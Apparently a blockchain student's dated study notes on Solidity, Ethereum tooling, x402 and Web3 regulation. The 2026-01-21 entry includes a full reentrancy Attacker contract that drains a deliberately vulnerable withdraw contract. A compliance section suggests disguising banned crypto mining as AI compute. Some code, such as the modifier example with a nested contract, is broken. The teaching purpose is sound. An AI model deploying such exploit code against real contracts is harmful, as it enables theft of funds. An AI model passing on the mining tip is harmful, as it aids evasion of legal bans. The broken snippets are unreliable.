---
timezone: UTC+8
---

# zw1919548103-coder

**GitHub ID:** zw1919548103-coder

**Telegram:** 

## Self-introduction

我是一名区块链工程的学生，希望通过本次学习更加深入的了解web3行业

## Notes

<!-- Content_START -->
# 2026-01-21
<!-- DAILY_CHECKIN_2026-01-21_START -->
一、 重入攻击漏洞（核心实战案例）

重入攻击是智能合约最常见的安全漏洞之一，核心问题是**外部调用时机不当**。

1\. 漏洞原理

当合约在**更新状态前**执行外部转账调用（`call`/`transfer`），攻击者可利用回调函数（`receive`/`fallback`）反复调用提现函数，耗尽合约资金。

2\. 代码对比（核心）

| 有漏洞版本（先转账后更新） | 安全版本（先更新后转账） |
| --- | --- |
| ```solidity |   |
| // SPDX-License-Identifier: MIT |   |
| pragma solidity ^0.8.0; |   |

contract VulnerableWithdraw {

mapping(address => uint256) public balance;

function deposit() external payable {

balance\[msg.sender\] += msg.value;

}

function withdraw() public {

require(balance\[msg.sender\] > 0, "No balance");

// ❌ 先转账（外部调用），后更新状态

(bool sent,) = msg.sender.call {value: balance \[msg.sender\]}("");

require (sent, "Transfer failed");

balance\[msg.sender\] = 0;

}

}

`|`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SafeWithdraw {

mapping(address => uint256) public balance;

function deposit() external payable {

balance\[msg.sender\] += msg.value;

}

function withdraw() public {

uint256 amount = balance\[msg.sender\];

require(amount > 0, "No balance");

// ✅ 先更新状态（锁定余额）

balance \[msg.sender\] = 0;

// ✅ 后执行外部转账

(bool sent,) = msg.sender.call {value: amount}("");

require (sent, "Transfer failed");

}

}

|

````

##### 3. 攻击代码与执行流程
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableWithdraw {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableWithdraw public target;
    address public owner;

    constructor(address _target) {
        target = IVulnerableWithdraw(_target);
        owner = msg.sender;
    }

    // 发起攻击：存入ETH并触发提现
    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // 重入回调点：转账时触发，反复调用提现
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    // 攻击者提取盗取的ETH
    function withdrawETH() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }
}
````

**攻击执行结果**：攻击者存入 1 ETH，最终盗取 2 ETH，被攻击合约余额减少 2 ETH。

二、 EVM 存储与 Gas 优化（核心基础）

EVM 的存储类型直接决定 Gas 成本，优化核心是**减少链上存储（Storage）的使用**。

| 存储类型 | 类比 | 特点 | Gas 成本 |
| --- | --- | --- | --- |
| Storage（链上存储） | 永久硬盘 | 数据上链、永久存储 | 极高：初始化 20000 Gas，修改 5000 Gas |
| Memory（运行时内存） | 临时工作台 | 函数执行后清空、不上链 | 低 |
| Calldata（调用参数） | 外卖窗口 | 只读、外部传入参数 | 极低 |
| Stack（计算栈） | 叠盘子架子 | 基础运算（如 1+1） | 极低 |

**Gas 优化秘籍**：能用 Memory/Calldata 的场景，绝不使用 Storage。

三、 Solidity 数据类型（Gas 优化关键）

| 类型分类 | 包含类型 | 核心优化点 |
| --- | --- | --- |
| 值类型 | uint8~uint256、address、bool 等 | 1. uint256 最常用，但 Storage 中可合并小位宽类型（如 uint8）省 Gas；2. 地址用 address 类型，禁止用 string 存地址（Gas 杀手） |
| 引用类型 | string、mapping、动态数组 | 1. 开辟新存储空间，Gas 成本高；2. mapping 是 “账本神器”（如存余额），比数组更高效 |

四、 ERC20 代币协议（基础应用）

ERC20 是代币通用标准，确保钱包 / 交易所能识别代币，核心组成：

1.  **五大核心存储**：名称（Name）、符号（Symbol）、精度（Decimals）、总供应量（Total Supply）、管理员地址（Owner）；
    
2.  **两本账本**：余额（balanceOf）、授权额度（allowance）；
    
3.  **关键函数**：
    
    -   `transfer`：直接转账；
        
    -   `approve`：授权（DeFi 核心操作）；
        
    -   `mint`：铸币（建议设为 internal，防止任意铸币）。
        

五、 合约函数可见性与修饰器（安全 + 复用）

1\. 函数可见性

| 关键字 | 作用 |
| --- | --- |
| external | 仅外部调用（更省 Gas） |
| public | 内部 / 外部均可调用 |
| internal | 仅合约内部 / 子合约调用 |
| private | 仅当前合约内部调用 |

2\. 修饰器（Modifier）—— 函数的 “保安”

-   **核心优势**：复用性（避免重复写`require`）、Gas 友好（仅编译一次）；
    
-   **核心语法**：`_;` 表示执行原函数逻辑；
    
-   **继承特性**：可继承、可重写（加`virtual`/`override`）。
    

solidity

```
// 示例：Owner修饰器
contract Base {
    address public owner;
    constructor() { owner = msg.sender; }

    // 父合约：virtual允许重写
    modifier onlyOwner() virtual {
        require(msg.sender == owner, "Not owner");
        _; // 执行原函数逻辑
    }

    // 子合约：override重写修饰器
    contract Child is Base {
        modifier onlyOwner() override {
            require(msg.sender == owner, "Not owner");
            require(owner != address(0), "Owner not set"); // 新增检查
            _;
        }
    }
}
```

六、 智能合约安全避坑指南

| 安全问题 | 核心原理 | 防范建议 |
| --- | --- | --- |
| 钓鱼钱包 | 合约账户伪装成普通钱包，转账函数被 modifier 锁死 | 验证钱包类型，警惕 “泄露私钥但转不出钱” 的账户 |
| 抢跑机器人（Front-running） | 机器人监控交易池，以更高 Gas 抢先执行交易 | 限制交易 Gas、使用闪电贷防护等 |
| 重入攻击 | 外部调用前未更新状态 | 先更新状态后执行外部调用（核心方案） |

七、 Solidity 继承（重点难点）

1\. 基础继承规则

-   **继承顺序**：按 “辈分从高到低” 声明（如`is Yeye, Baba`，爷爷在前、爸爸在后）；
    
-   **关键字**：
    
    -   `virtual`：父合约函数 / 修饰器允许被重写；
        
    -   `override`：子合约重写父合约的函数 / 修饰器；
        
    -   多父合约同名函数：需用`override(Parent1, Parent2)`指明重写对象。
        

2\. 菱形继承与 C3 线性化

-   **菱形继承**：多个子合约继承同一父合约，底层合约又继承这些子合约（如 God→Adam/Eve→Human）；
    
-   **C3 线性化**：Solidity 解决菱形继承冲突的算法，核心规则：
    
    1.  继承声明顺序：辈分高→低（如`is Adam, Eve`）；
        
    2.  `super`调用顺序：声明从右到左（Eve→Adam→God）；
        
    3.  每个合约仅调用一次（避免重复执行）。
        

**代码演示结果**：调用`Human.foo()`会按 `Human → Eve → Adam → God` 顺序执行`super.foo()`，且 God 仅执行一次。

八、 开发工具与辅助知识点

1\. Remix IDE（核心开发工具）

-   编译阶段：虚拟 EVM 中检测 Bug；
    
-   部署阶段：将代码编译为字节码上链，执行构造函数初始化；
    
-   只读函数（View/Pure）：不消耗 Gas，可自由调用测试。
    

2\. 事件（Event）—— 低成本存储 + 前端交互

-   **核心特点**：
    
    1.  响应性：前端（ethers.js）可通过 RPC 监听事件并交互；
        
    2.  经济性：仅消耗约 2000 Gas，远低于 Storage（20000 Gas）；
        
-   **本质**：EVM 日志的抽象，用于记录关键操作（如转账、铸币）。
<!-- DAILY_CHECKIN_2026-01-21_END -->

# 2026-01-19
<!-- DAILY_CHECKIN_2026-01-19_START -->

## 一、 Solidity 变量类型

变量类型分为**值类型、引用类型、映射类型**，其中**值类型**为合约开发基础，赋值时直接传递数值，核心分类及特性如下：

| 类型 | 特性 | 适用场景 |   |   |
| --- | --- | --- | --- | --- |
| 布尔型（bool） | 取值仅 true/false；支持逻辑非 / 与 / 或 / 相等判断；逻辑与 (&&)、或 ( |   | ) 遵循短路规则 | 条件判断、状态标记 |
| 整型（int/uint） | 分带符号（int）和无符号（uint），常用 uint256；支持加减乘除、取余、幂运算、比较运算 | 数值计算、数量统计 |   |   |
| 地址类型（address/payable address） | 普通 address：存储账户地址；payable address：额外支持转账、查询余额方法 | 账户交互、ETH 转账 |   |   |
| 定长字节数组（bytes1~bytes32） | 长度不可变，最大 32 字节；支持下标访问单个字节 | 存储固定长度的二进制数据 |   |   |
| 枚举（enum） | 用户自定义类型，本质是给 uint 值分配名称；提升代码可读性，实际应用较少 | 有限状态的清晰表达 |   |   |

## 二、 Solidity 函数核心特性

函数是实现复杂操作的核心，声明需指定**可见性、功能权限**等关键字。

1.  **函数可见性（必须显式指定）**
    
    -   `public`：合约内外均可访问
        
    -   `private`：仅当前合约可访问
        
    -   `external`：仅外部可访问，内部调用需通过`this`
        
    -   `internal`：当前合约及继承合约可访问
        
2.  **核心功能关键字（减少 Gas 消耗 / 扩展功能）**
    
    | 关键字 | 核心作用 | 状态操作限制 |
    | --- | --- | --- |
    | view | 减少 Gas 消耗，用户直接调用免 Gas | 可读取状态变量，不可修改 |
    | pure | 减少 Gas 消耗，用户直接调用免 Gas | 不可读取、不可修改状态变量，仅处理输入参数计算 |
    | payable | 标识函数可接收 ETH | 支持调用时向合约转入 ETH |
    | virtual | 允许函数被继承合约重写 | - |
    | override | 标识函数为重写父合约的函数 | 需与父合约virtual搭配使用 |
    

## 三、 代币标准（区块链资产协议）

### 核心概念

DApp 相当于应用商店，**代币**是商店内流通的 “商品 / 股票”，属于独立于 DApp 的资产层。

### 3.1 为什么不直接用 ETH？

| 逻辑维度 | ETH 的局限性 | 代币的优势 |
| --- | --- | --- |
| 商业逻辑（发行权） | 属于公链原生资产，项目方无法凭空发行 | 项目方可零成本发行，用于融资、分红、社区治理 |
| 功能逻辑（稳定性） | 价格波动大，不适合日常支付 / 储蓄 | 可定制化，如稳定币（USDT）锚定法币价值 |
| 技术逻辑（标准化） | 原生资产接口与代币标准不兼容 | ERC 系列标准提供统一接口，交易所 / 钱包可批量支持 |

> 补充：WETH 是将 ETH 打包为 ERC-20 标准的代币，解决 ETH 与 ERC-20 代币的接口兼容问题。

### 3.2 主流代币标准对比

| 特性 | ERC-20（可替代代币） | ERC-721（不可替代代币 / NFT） | ERC-1155（混合标准） | ETH（原生代币） |
| --- | --- | --- | --- | --- |
| 核心定义 | 同质化，只论数量，可互换 | 独一无二，论个体 ID，不可互换 | 单合约管理多类资产（含同质化 + 非同质化） | 公链原生燃料资产 |
| 生活类比 | 百元大钞 | 房产证、飞机票 | 超市货架 / 游戏背包 | 黄金、电力 |
| 拆分性 | 可拆分（如 0.1 个） | 通常不可拆分 | 支持部分资产拆分 | 可拆分（如 0.0001 ETH） |
| 典型用途 | 稳定币、积分、平台股权 | 数字艺术品、游戏装备、现实资产上链 | 游戏道具打包、多资产批量转账 | 支付 Gas 费、链上价值存储 |
| 核心优势 | 标准化程度高，流通性强 | 资产唯一性强，确权清晰 | 批量操作节省 Gas，适 |   |
<!-- DAILY_CHECKIN_2026-01-19_END -->

# 2026-01-18
<!-- DAILY_CHECKIN_2026-01-18_START -->


## 一、 Etherscan 使用核心指南

### 1\. 核心查询：三类可搜索信息

在 Etherscan 首页顶部搜索框，输入以下内容即可查询对应信息：

-   **钱包地址**：查看该地址的资产余额、交易历史、持有 NFT
    
-   **交易哈希（TxID/Hash）**：类似快递单号，查询单笔转账的具体细节
    
-   **合约地址**：查看代币（如 USDT）或 DeFi 协议的源码、交互记录
    

### 2\. 交易详情页关键字段解读

| 字段 | 含义 |
| --- | --- |
| Status | Success = 交易成功；Failed = 交易失败（多因 Gas 不足或合约逻辑错误） |
| Block | 交易被打包的区块高度，确认数越多，交易越不可篡改 |
| From/To | 发送方 / 接收方，To 旁带小图标代表接收方为智能合约 |
| Value | 转账的 ETH 数量；代币转账（如 USDC）此项可能为 0，需查看 Tokens Transferred |
| Transaction Fee | 实际手续费 = Gas Used × Gas Price |

### 3\. 资金流向追踪方法

资金追踪分为两类路径，覆盖普通转账与合约触发转账场景：

-   **路径 A：查看钱包资产明细**
    
    进入钱包地址页面，可查看三类记录：
    
    1.  Transactions：普通 ETH 转账记录
        
    2.  ERC-20 Token Txns：稳定币（USDT/USDC）或其他代币的进出记录
        
    3.  NFT Transfers：ERC-721/ERC-1155 标准 NFT 的转移记录
        
-   **路径 B：查看内部交易（Internal Transactions）**
    
    由合约触发的资金转移（如 Uniswap 交易），不会出现在普通交易列表，需在该选项卡查看，是初学者易忽略的点。
    

### 4\. 进阶功能：Gas 追踪与合约交互

-   **Gas Tracker**：网络拥堵时，查看当前平均 Gas 价格（单位 Gwei），避免因手续费过低导致交易 Pending（挂起）
    
-   **Read/Write Contract**
    
    1.  Read：无需连接钱包，直接查询合约数据（如代币总量）
        
    2.  Write：连接 MetaMask 后，可直接调用合约函数（如项目官网故障时紧急撤资）
        

### 5\. 安全风险警惕

-   **代币钓鱼**：陌生代币转入钱包时，切勿前往其官网做 “解冻”“授权” 操作
    
-   **标签系统**：Etherscan 会为黑客地址、交易所地址打标签（如 Binance 1），可快速识别资金去向
    

## 二、 社区运营学习路线图

### 1\. 夯实核心概念

-   **定义**：通过建立和维护社区，提升品牌认知度、忠诚度与用户活跃度，获取长期用户支持
    
-   **核心目标**：增加用户粘性、提升品牌忠诚度、激发活跃度、借口碑驱动增长
    
-   **社区类型**：产品社区、兴趣社区、品牌社区、技术社区、客户服务社区等
    
-   **核心职责**：社区管理、内容创建、用户互动、活动策划、数据分析
    

### 2\. 掌握平台与工具

-   **主流社区平台**
    
    -   社交媒体平台：Facebook、Instagram、微博、Twitter
        
    -   讨论平台：Reddit、知乎、Slack、Discord、Telegram
        
    -   内容管理平台：Medium、WordPress、Blogger
        
-   **必备运营工具**
    
    -   社群管理工具：Hootsuite、Buffer（社媒管理）；Trello、Asana（任务管理）；Google Analytics（数据分析）
        
    -   邮件营销工具：MailChimp、SendGrid（管理邮件列表、发起活动通知）
        
    -   活动管理工具：Eventbrite（活动策划与执行）
        

### 3\. 做好用户关系管理

-   **构建用户画像**：分析用户行为、需求、兴趣，确保运营内容贴合用户偏好
    
-   **设计互动策略**：针对活跃用户，引导参与深度讨论或活动组织；针对沉默用户，用问卷、奖品激活
    
-   **收集反馈优化**：通过调查、评论等渠道收集反馈，迭代运营策略
    

### 4\. 内容创作与发布

-   **内容策划**：创作文本、视频、图片、图表等多形式内容
    
-   **话题选择**：围绕产品更新、行业动态、教程、互动问答等用户兴趣点选题
    
-   **发布节奏**：把控内容发布频率与时机，避免过度推送或长期断更
    

### 5\. 活动策划与管理

-   **线上活动**：问答、研讨会、抽奖、挑战赛，提升参与感
    
-   **线下活动**：沙龙、聚会、讲座，增强用户忠诚度与粘性
    
-   **效果复盘**：通过数据分析活动效果，调整后续运营策略
    

### 6\. 社群文化建设

-   **营造社区氛围**：打造正向、包容的环境，保障用户自由发言且遵守规范
    
-   **传递核心价值观**：通过内容、活动、管理方式输出价值观，强化用户认同感
    
-   **设置激励机制**：用积分、徽章、排行榜等奖励活跃用户，激发持续参与
    

### 7\. 数据分析与优化

以数据驱动运营，聚焦核心 KPI 并持续优化：

-   **核心 KPI**：用户活跃度（DAU/MAU）、留存率、增长率、参与率、内容分享量
    
-   **分析维度**：社媒互动数据（点击、评论、分享）、用户行为数据（识别高吸引力内容 / 活动 / 话题）
<!-- DAILY_CHECKIN_2026-01-18_END -->

# 2026-01-16
<!-- DAILY_CHECKIN_2026-01-16_START -->



## 一、Web3合规核心要点

核心原则：企业重合规，个人重风控；法律存在滞后性，“法无规定不处罚”，新兴业务与法律滞后性的矛盾需梳理协调，避免与中心化法律对抗，应与当局构建良好关系，适配中国特色加密货币合规框架。

### 三大负面清单及要点

-   ICO公开融资：普通meme币发行无违法风险，但若“撤池子”将被认定为诈骗。
    
-   虚拟货币交易所：炒合约不属于赌博（区别于传统赌博的“买定离手”，合约具备风险自控权），打击交易所存在逐利性执法可能。
    
-   虚拟货币挖矿：可通过AI算力掩饰，甚至争取补贴，或以外包、外贸形式操作。
    

### 其他实操风险提示

-   U商：国内无法开展，海外可行，终极形态为加密支付，需关注U卡合规性及跑路风险。
    
-   项目方工作：部分公司与公安合作，卧底固定证据并获取线索奖励，需提高警惕。
    
-   KOL风险：为交易所做返佣，可能涉嫌成为开设赌场的帮凶。
    

## 二、x402相关解析

### 1\. 历史沿革

HTTP 402状态码由蒂姆·伯纳斯-李团队预留，定义为“需要支付”，因早年缺乏成熟去中心化数字货币技术，长期处于“休眠”状态。x402并非区块链或代币，而是开放互联网支付标准，核心是借助区块链技术（Layer 2、稳定币）复活该状态码，实现无摩擦、无需许可的机器可读支付协商机制，打通网络价值传输通道。

### 2\. 技术架构与运行机理

四方架构模型

-   客户端（买方）：多为AI智能体等，持有加密钱包及稳定币，无需Gas代币。
    
-   资源服务器（卖方）：提供付费资源，集成x402中间件，可拦截未付费请求并返回402状态码。
    
-   服务商/协调器：Web2服务，承担签名验证、Gas垫付、支付结果确认等桥梁作用。
    
-   区块链结算层：基于Base、Solana等高性能链，实现价值最终转移。
    

核心支付流程

客户端发起请求→服务端返回402状态码及支付元数据→客户端用私钥签名授权（遵循EIP-712标准，无需Gas）→客户端附带签名重试请求→服务商验证并垫付Gas上链结算→服务端交付资源。

关键技术：EIP-3009与Gasless机制

通过EIP-3009标准，客户端授权第三方（服务商）触发转账，无需持有ETH支付Gas，仅需稳定币即可运行，降低AI智能体支付门槛。

### 3\. 与其他支付方案对比

x402 vs. L402（闪电网络）

x402以稳定币计价、波动性低、开发者友好（适配Web2技术），商业可用性更强；L402去中心化及隐私性更优，但资产波动大、基础设施要求高，适配场景有限。

x402 vs. Stripe Agentic Commerce

二者互补：x402聚焦AI上游资源支付（算力、数据等即时数字化商品）；Stripe聚焦下游商业行为（实物预订、退款等，依赖传统金融支持）。

### 4\. 实际应用案例

-   Heurist：去中心化AI算力网络，支持按次推理付费，实现算力即时货币化。
    
-   Virtuals Protocol：构建AI智能体协作经济，实现智能体间自动付费交互（如音乐授权），形成机器经济闭环。
    
-   货币化MCP服务器：为AI模型提供付费独家数据，助力个人开发者数据变现。
    

基础设施支持

Coinbase与Cloudflare合作，支持在边缘计算平台部署x402网关；Thirdweb、QuickNode提供x402工具包，降低开发集成门槛。

### 5\. 总结

x402解决AI与Web3结合的实际支付问题，非投机性基建，获Coinbase力推。其打通AI智能体自主支付通道，既提升链上活跃度，又助力AI摆脱平台API限制，利好二者深度融合。

## 三、核心心得与反思

### 1\. a16z对builder的建议

行业单一化导致脆弱性与内卷，差异化是破局关键；ZK、MPC等密码学技术已趋成熟，迎来爆发拐点；稳定币在外贸领域应用广泛，未来企业将被迫普及使用，趋势明确。

### 2\. 反思：AI Agent结合TEE与ERC-8004

TEE可确保AI Agent的prompt公开可验证，规避高声誉Agent作恶风险，核心问题转向防止Agent“判断错误”“依赖注入”及危险操作；但TEE存在API限制，影响灵活度（如随机API调用）。

### 3\. 反思：X禁止InfoFi，Kaito关闭Yaps

依赖单一API的商业模式存在天然脆弱性，去中心化、无需许可是产品永续的关键，此类黑天鹅事件具有必然性，需提前规避架构风险。
<!-- DAILY_CHECKIN_2026-01-16_END -->

# 2026-01-15
<!-- DAILY_CHECKIN_2026-01-15_START -->




## 一、以太坊节点与客户端

以太坊节点是运行以太坊客户端软件并接入网络的电脑，而客户端是以太坊协议的具体实现，负责验证数据、同步区块状态，保障网络安全。完整的以太坊全节点由执行客户端（EL）、共识客户端（CL）组成，如需参与质押验证，还需搭配验证者客户端。

### 1\. 三大客户端核心功能

-   **执行客户端**：核心负责链上业务逻辑与状态管理，包括监听并在以太坊虚拟机（EVM）中执行交易及智能合约、维护链上状态数据库、提供JSON-RPC接口供dApp、钱包调用，同时通过P2P网络转发交易与区块数据。
    
-   **共识客户端**：聚焦权益证明（PoS）共识机制，维护信标链视图与分叉选择规则，在每个时间片（slot）确定区块提议者并参与投票，跟踪验证者集合、质押余额及惩罚机制，最终裁定哪些区块可接入主链。
    
-   **验证者客户端**：管理验证者密钥，在轮到自身时提议新区块，且在每个时间片为所见区块进行投票（attestation），是PoS共识中的核心执行角色。
    

### 2\. 节点与客户端的协作关系

全节点通过“执行客户端+共识客户端”的组合实现完整功能，二者通过Engine API高效协作：执行客户端负责交易计算、状态管理与对外接口服务，共识客户端负责共识机制运行、区块筛选与投票；整体节点再通过P2P网络与全网节点交互，保障数据同步与网络稳定。

## 二、智能合约理论基础

智能合约本质是部署在区块链上的“数字自动售货机”，遵循“If-Then”逻辑，满足预设条件即可自动执行，无需第三方背书，兼具确定性、不可篡改性与公开可追溯性，是以太坊生态的核心组件。

### 1\. 核心技术与产物

-   **Solidity语言**：为EVM量身定制的静态类型语言，是Web3领域应用最广泛、生态最成熟的智能合约开发语言，原生支持账户余额、合约存储、Gas消耗及事件日志处理，搭配OpenZeppelin等标准化合约库，可快速构建安全的DeFi、NFT应用。
    
-   **字节码与ABI**：字节码是合约在链上运行的机器语言，部署时EVM执行初始化代码并存储运行时代码；ABI（应用二进制接口）为JSON格式的交互说明书，用于指导DApp或其他合约调用目标合约功能，是外界与二进制字节码交互的核心桥梁。
    

### 2\. 合约生命周期与安全准则

合约通过交易部署至全网后获得唯一0x地址，可由外部账户（EOA）或其他合约触发交互；因代码不可直接修改，主流通过代理模式实现逻辑升级，坎昆升级后自毁指令功能大幅削弱，已不推荐作为常规维护手段。

安全层面，Solidity 0.8.0及以上版本自动处理整数溢出问题，降低初级漏洞风险；由于链上资产价值极高，合约必须经静态分析工具（如Slither）检测与专业人工审计，防范重入攻击等高级漏洞。从开发者视角，合约被动执行、ABI是交互核心、追求可预测性是开发首要目标。

## 三、NFT相关核心知识

### 1\. NFT本质与应用价值

NFT（非同质化代币）的核心是“数字所有权”，凭借链上溯源性保障艺术家创作记录公开不可篡改，区别于普通数字文件复制件。其应用场景包括数字藏品、特定社群准入凭证、治理投票凭证等，可通过OpenSea等二级市场交易，或在艺术家官网直接铸造（Mint）。

### 2\. 核心标准与存储方案

-   **ERC-20与ERC-721差异**：ERC-20为同质化代币，核心是余额表数值增减，类似传统货币；ERC-721为非同质化代币，核心是所有权表管理，每个代币拥有唯一索引，转账本质是变更特定ID的所有权。
    
-   **存储方式对比**：链上存储（如Loot项目）将图像与元数据直接写入合约，去中心化程度极高但成本昂贵；主流方案为IPFS存储，链上仅记录哈希值，通过内容寻址保障数据不可篡改，若指向中心化服务器则存在开发者“跑路（Rug Pull）”风险。
    

### 3\. 生态特性与价值分配

NFT依托Web3开源特质，用户可通过Etherscan查看合约代码，验证发行规则透明度；同时实现去中介化，让艺术家直接对接粉丝，摆脱传统平台抽成，还可通过合约设置，在二级市场交易中自动获取版税收益。

## 四、交易优化与生态工具

### 1\. 交易故障处理与Gas机制

交易卡住与Nonce（交易顺序编号）直接相关，低Gas交易卡住会阻塞后续同地址更高Nonce交易，可通过“加速（Speed Up）”或“取消”交易（发送同Nonce、更高Gas或金额为0的自转账交易）解决；MetaMask状态不同步时，可通过“重置账户”清空本地记录，重新同步链上数据。

Gas机制中，Gas Limit为交易最大工作量上限（防死循环），Max Fee为单位工作量单价；简单ETH转账需21,000 Gas，复杂合约交互因存储操作增多需更高Gas。EIP-1559机制下，建议设置1.5-2.0 Gwei优先费用，确保交易快速打包。

### 2\. 核心生态工具与方案

-   **ERC-20授权**：交易ERC-20代币需两步操作，先通过Approve授权合约动用代币，再发起业务交易，授权前需确认合约安全性。
    
-   **Layer 2（L2）扩容**：通过跨链桥（如Optimism Bridge）将资金转入L2，虽桥接有短时真空期，但可大幅降低交易费、提升确认速度，安全性由以太坊主网（L1）最终保障。
    
-   **多签钱包（Gnosis Safe）**：支持分布式所有权（如2-of-4模式，需4名管理者中2人签名方可执行交易），是大额资产保护的最优方案，可规避单点故障与私钥泄露风险，通过WalletConnect可对接DeFi应用实现团队级资产管理。
    

## 五、ENS域名应用

ENS（以太坊域名服务）是提升用户体验的核心工具，可将复杂钱包地址简化为易记域名，用户支付少量ETH即可获取指定时长的ENS域名。每个ENS域名对应管理者（manager）与所有者（owner），初始状态下二者均为域名创建者，支持所有者指向其他ENS域名。

反向解析是ENS核心功能，操作步骤为：在账户“反向记录”中选择自有ENS域名，提交设置并支付Gas完成链上交易。其作用在于，一个地址可拥有多个ENS域名，反向解析可指定一个主域名用于显示，且无需转移域名所有权即可随时修改指向。
<!-- DAILY_CHECKIN_2026-01-15_END -->

# 2026-01-14
<!-- DAILY_CHECKIN_2026-01-14_START -->





## 一、中国监管基调与核心政策

### （一）监管总基调

我国对Web3领域的监管坚持“全面封堵虚拟货币金融属性，有限容忍区块链技术创新”的原则。Web3技术本身不违法，但一旦触及Token发行、交易、矿池运营等相关场景，极易涉嫌刑事犯罪。

### （二）核心限制政策（2017年起）

1\. 禁止ICO、IEO、IDO等各类代币融资行为，从源头遏制非法金融融资活动；

2\. 禁止境内虚拟货币交易所运营，同时禁止境外交易所向境内居民提供服务，切断虚拟货币交易的境内渠道；

3\. 明确虚拟货币不具有法偿性，不得作为货币在市场上流通使用，不能充当支付工具；

4\. 严厉打击以虚拟货币为载体的赌博、传销、洗钱、非法集资等各类违法犯罪行为，维护金融市场秩序。

## 二、核心法律风险梳理

### （一）代币发行与交易风险

任何具备融资功能或可流通性的代币发行，无论命名为“积分”“治理Token”等何种形式，均属于非法金融行为。技术人员若参与代币模型设计、合约部署，会被认定为共同行为人，不能以“仅写代码”为由免除责任。此外，空投、白名单分发代币若实质面向公众筹资，可能构成非法吸收公众存款罪，需承担相应刑责。

### （二）刑事风险（赌博、传销、洗钱等）

各类常见罪名及对应风险行为特征如下：

1\. 开设赌场罪：链游设置“充值-抽奖-提现”闭环，以虚拟货币为筹码，具备“以小博大”的概率机制，符合赌场运营核心特征；

2\. 组织、领导传销活动罪：NFT、DAO、挖矿等项目设置“邀请返利”“多级推广”“团队计酬”模式，通过发展人员获取收益，涉嫌传销；

3\. 洗钱罪：通过虚拟货币转换、跨境转移犯罪所得，且未落实KYC（客户身份识别）、AML（反洗钱）相关措施，帮助隐藏资金来源；

4\. 非法经营罪：利用虚拟货币开展跨境换汇、资金支付结算业务，未经监管部门许可，擅自从事金融业务。

### （三）民商事争议风险

虚拟货币买卖、委托代投相关合同，因违反监管政策及公序良俗，大概率会被法院认定为无效，相关诉求通常不予支持，风险由当事人自行承担。若委托代投过程中出现资金亏损、去向不明等问题，受托方可能面临民事赔偿责任，情节严重的还可能涉及非法经营罪、非法集资罪等刑事罪名。

## 三、全球监管趋势与各地区框架

### （一）主要地区监管框架

1\. 美国：采用SEC（证券交易委员会）与CFTC（商品期货交易委员会）分工监管模式，SEC将部分加密资产视为证券监管，频繁对交易所提起诉讼，重点关注DeFi协议的证券属性；CFTC则将其视为商品监管；OCC（货币监理署）允许银行提供加密货币托管服务，支持稳定币在银行体系中的应用，同时推进稳定币专项立法。

2\. 欧盟：MiCA（加密资产市场法规）于2024年正式生效，是全球首个全面的加密货币监管框架。该法规对稳定币发行商提出严格的资本和流动性要求，要求其持有等值储备资产，大型稳定币（用户超100万）面临更严苛监管，同时明确禁止算法稳定币（如Terra UST）；此外，要求所有加密货币服务提供商必须获得许可证方可开展业务。

3\. 香港：2023年6月起实施加密货币交易所牌照制度，态度相对开放，计划在2024-2025年推出稳定币监管框架，逐步完善加密资产监管体系。

### （二）FATF核心要求

虚拟资产服务提供商（VASP）需严格遵守Travel Rule（旅行规则），转账金额超过1000美元/欧元时，必须收集收发双方的身份信息及交易细节。目前，DeFi协议、去中心化交易所因去中心化特性，面临着严峻的合规适配挑战。

### （三）监管趋势总结

1\. 趋严化：全球范围内均强化对稳定币、交易所、DeFi的监管，逐步对标传统金融行业的合规标准，压缩灰色空间；

2\. 协调化：FATF、G20等国际组织积极推动全球监管协同，跨境监管合作不断加强，应对加密资产跨境流动风险；

3\. 合规成本上升：Web3企业需配置专业法务团队，主动调整业务模式以适配各地监管要求，合规投入持续增加。

## 四、入职Web3行业风险防范指南

### （一）雇佣关系风险

境外Web3项目通常无境内用工主体，无法与员工签订有效劳动合同、缴纳五险一金，后续若发生薪资争议、工伤等问题，员工维权难度极大。部分项目方会通过EOR（名义雇主）模式，委托国内合规公司与员工签署合同，可部分解决合规问题，但纠纷发生时，劳动关系的认定仍存在法律难点。建议入职前明确是否接受灵活用工、无社保公积金的安排，必要时咨询专业律师评估风险。

### （二）薪酬结构风险

我国法律明确规定工资应以人民币支付，以Token、USDT等形式发薪可能被认定为无效。同时，自发Token作为薪资存在价值归零风险，且会拉低社保、经济补偿的计算基数，损害员工长远权益。Web3企业常见“人民币+Token”或“全USDT”薪酬模式，入职前需充分评估潜在风险。

### （三）虚拟货币出金风险

出金时应优先选择可信合规渠道，避免参与灰色交易。同时，需留存资金合法来源的完整记录，防止因交易对手资金涉及黑产，导致个人银行卡被冻结，甚至卷入刑事案件。

### （四）项目合法性审查

入职前需仔细查阅项目白皮书、Token分发机制、收益模型，重点关注三大核心：是否面向境内用户开展业务、是否承诺保本收益、是否包含多级返利结构，规避参与非法项目。

## 五、其他风险提示与补充知识点

### （一）额外风险提示

1\. 虚拟货币属性定性：我国不认可虚拟货币的货币属性，但依法保护其作为财产的价值；需明确，所有与虚拟货币相关的业务活动均属于非法金融活动；

2\. 挖矿风险：虚拟货币挖矿属于淘汰类产业，已被我国全面禁止，参与挖矿活动存在法律风险；

3\. 立法趋势：2025年中央政法工作会议提出研究虚拟货币立法建议，后续行业监管将逐步走向规范化、法治化。

### （二）Web3相关知识点补充

1\. 以太坊账户类型：以太坊中仅存在EOA和合约账户两类账户。其中，EOA（外部拥有账户）由公私钥对控制，归用户（个人/机构）持有私钥，可主动发起交易，无合约代码；合约账户无私钥，行为由部署时的代码“锁死”，不能主动发起交易，仅能被调用后按合约逻辑执行，且具备代码和存储（storage）功能。

2\. U卡使用风险：部分U卡供应商与万事达等机构达成合作，客户使用U卡时，实质是挂靠在该供应商在万事达的合作公司名下，以其员工身份使用，该模式存在身份冒用、合规性不足等潜在风险，需谨慎选择。
<!-- DAILY_CHECKIN_2026-01-14_END -->

# 2026-01-13
<!-- DAILY_CHECKIN_2026-01-13_START -->






### 1\. 资产自托管：如何提高安全性、降低管理私钥的复杂度？

